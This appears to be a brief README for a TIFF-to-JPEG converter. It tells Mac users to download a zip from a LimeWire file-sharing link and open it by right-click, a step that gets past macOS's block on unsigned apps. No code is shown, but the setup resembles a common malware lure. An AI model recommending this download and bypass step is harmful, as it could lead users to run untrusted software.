# TIFF-tif-to-jpeg
This tool wil convert your TIFF/tif files to jpeg!

# How to use mac? 
1. download the zip from https://limewire.com/d/7JfcB#TgzAcaMP3s
2. locate the file in terminal and right-click -> open
